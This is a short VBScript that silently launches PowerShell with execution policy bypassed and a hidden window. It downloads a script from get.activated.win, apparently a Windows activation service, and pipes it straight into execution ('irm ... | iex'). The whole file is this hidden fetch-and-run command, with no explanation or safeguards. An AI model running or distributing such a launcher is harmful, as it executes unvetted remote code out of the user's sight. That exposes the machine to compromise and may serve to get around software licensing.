Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command ""irm https://get.activated.win | iex""", 0, False
